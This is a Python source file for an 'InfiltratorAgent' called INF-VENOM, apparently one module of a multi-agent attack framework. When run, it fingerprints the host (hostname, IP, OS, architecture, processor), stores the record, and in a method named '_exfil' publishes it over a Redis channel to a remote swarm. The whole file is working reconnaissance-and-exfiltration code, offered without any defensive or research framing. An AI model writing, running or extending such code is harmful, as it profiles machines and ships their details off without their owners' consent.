from agents.base import BaseAgent
import platform, socket, time, json, logging, uuid, hashlib
from datetime import datetime

log = logging.getLogger("INF-VENOM")

class InfiltratorAgent(BaseAgent):
    def __init__(self):
        super().__init__("INF-VENOM")
        self.delay = 2 if getattr(self, "priority", None) == "low" else 0

    # ------------------------------------------------------------------
    def run(self):
        super().run()
        if self.delay:
            log.info("Low-priority mode, delaying %ss...", self.delay)
            time.sleep(self.delay)

        fp = self._fingerprint()
        self._store(fp)
        self._exfil(fp)
        log.info("Host fingerprint complete: %s", fp["hostname"])

    # ------------------------------------------------------------------
    def _fingerprint(self) -> dict:
        """Collect + hash sensitive but non-PII fields."""
        try:
            raw = {
                "hostname": socket.gethostname(),
                "ip": socket.gethostbyname(socket.gethostname()),
                "os": platform.system(),
                "os_version": platform.version(),
                "arch": platform.machine(),
                "proc": platform.processor(),
                "ts": datetime.utcnow().isoformat(),
                "uuid": uuid.uuid4().hex[:8],
            }
            # deterministic hash for dedup
            raw["id"] = hashlib.sha256(
                f"{raw['hostname']}{raw['ip']}".encode()
            ).hexdigest()[:16]
            return raw
        except Exception as e:
            log.exception("Fingerprint error")
            return {"error": str(e)}

    # ------------------------------------------------------------------
    def _store(self, fp: dict):
        """Persist to Blackroot IdentityMap if kernel present."""
        if self.kernel and hasattr(self.kernel, "memory"):
            self.kernel.memory[fp["id"]] = fp
        else:
            log.debug("No kernel memory, skipping store")

    # ------------------------------------------------------------------
    def _exfil(self, fp: dict):
        """Send via SwarmMesh (Redis) if present."""
        if self.kernel and hasattr(self.kernel, "swarm"):
            self.kernel.swarm.redis.publish(
                "fingerprint", json.dumps(fp, separators=(",", ":"))
            )
        else:
            log.debug("No swarm, local only")